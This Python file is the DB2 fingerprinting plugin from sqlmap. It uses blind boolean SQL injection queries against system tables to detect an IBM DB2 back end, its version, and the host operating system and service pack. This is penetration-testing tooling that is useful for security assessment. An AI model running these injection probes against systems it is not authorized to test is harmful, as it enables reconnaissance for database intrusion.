#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import Backend
from lib.core.common import Format
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.session import setDbms
from lib.core.settings import DB2_ALIASES
from lib.request import inject
from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self, DBMS.DB2)

    def _versionCheck(self):
        minor, major = None, None

        for version in reversed(xrange(5, 15)):
            result = inject.checkBooleanExpression("(SELECT COUNT(*) FROM sysibm.sysversions WHERE versionnumber BETWEEN %d000000 AND %d999999)>0" % (version, version))

            if result:
                major = version

                for version in reversed(xrange(0, 20)):
                    result = inject.checkBooleanExpression("(SELECT COUNT(*) FROM sysibm.sysversions WHERE versionnumber BETWEEN %d%02d0000 AND %d%02d9999)>0" % (major, version, major, version))
                    if result:
                        minor = version
                        version = "%s.%s" % (major, minor)
                        break

                break

        if major and minor:
            return "%s.%s" % (major, minor)
        else:
            return None

    def getFingerprint(self):
        value = ""
        wsOsFp = Format.getOs("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = Format.getOs("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "

        if not conf.extensiveFp:
            value += DBMS.DB2
            return value

        actVer = Format.getDbms()
        blank = " " * 15
        value += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp.get("dbmsVersion")

            if banVer:
                banVer = Format.getDbms([banVer])
                value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = Format.getErrorParsedDBMSes()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        if not conf.extensiveFp and Backend.isDbmsWithin(DB2_ALIASES):
            setDbms(DBMS.DB2)

            return True

        logMsg = "testing %s" % DBMS.DB2
        logger.info(logMsg)

        result = inject.checkBooleanExpression("[RANDNUM]=(SELECT [RANDNUM] FROM SYSIBM.SYSDUMMY1)")

        if result:
            logMsg = "confirming %s" % DBMS.DB2
            logger.info(logMsg)

            result = inject.checkBooleanExpression("JULIAN_DAY(CURRENT DATE) IS NOT NULL")

            if not result:
                warnMsg = "the back-end DBMS is not %s" % DBMS.DB2
                logger.warn(warnMsg)

                return False

            version = self._versionCheck()
            if version:
                Backend.setVersion(version)
                setDbms("%s %s" % (DBMS.DB2, Backend.getVersion()))
            else:
                setDbms(DBMS.DB2)

            return True
        else:
            warnMsg = "the back-end DBMS is not %s" % DBMS.DB2
            logger.warn(warnMsg)

            return False

    def checkDbmsOs(self, detailed=False):
        if Backend.getOs():
            return

        infoMsg = "fingerprinting the back-end DBMS operating system "
        infoMsg += "version and service pack"
        logger.info(infoMsg)

        query = "(SELECT LENGTH(OS_NAME) FROM SYSIBMADM.ENV_SYS_INFO WHERE OS_NAME LIKE '%WIN%')>0"
        result = inject.checkBooleanExpression(query)

        if not result:
            Backend.setOs(OS.LINUX)
        else:
            Backend.setOs(OS.WINDOWS)

        infoMsg = "the back-end DBMS operating system is %s" % Backend.getOs()

        if result:
            versions = {
                "2003": ("5.2", (2, 1)),
                "2008": ("7.0", (1,)),
                "2000": ("5.0", (4, 3, 2, 1)),
                "7": ("6.1", (1, 0)),
                "XP": ("5.1", (2, 1)),
                "NT": ("4.0", (6, 5, 4, 3, 2, 1))
            }

            # Get back-end DBMS underlying operating system version
            for version, data in versions.items():
                query = "(SELECT LENGTH(OS_VERSION) FROM SYSIBMADM.ENV_SYS_INFO WHERE OS_VERSION = '%s')>0" % data[0]
                result = inject.checkBooleanExpression(query)

                if result:
                    Backend.setOsVersion(version)
                    infoMsg += " %s" % Backend.getOsVersion()
                    break

            if not Backend.getOsVersion():
                return

            # Get back-end DBMS underlying operating system service pack
            for sp in versions[Backend.getOsVersion()][1]:
                query = "(SELECT LENGTH(OS_RELEASE) FROM SYSIBMADM.ENV_SYS_INFO WHERE OS_RELEASE LIKE '%Service Pack " + str(sp) + "%')>0"
                result = inject.checkBooleanExpression(query)

                if result:
                    Backend.setOsServicePack(sp)
                    break

            if not Backend.getOsServicePack():
                Backend.setOsServicePack(0)
                debugMsg = "assuming the operating system has no service pack"
                logger.debug(debugMsg)

            if Backend.getOsVersion():
                infoMsg += " Service Pack %d" % Backend.getOsServicePack()

            logger.info(infoMsg)
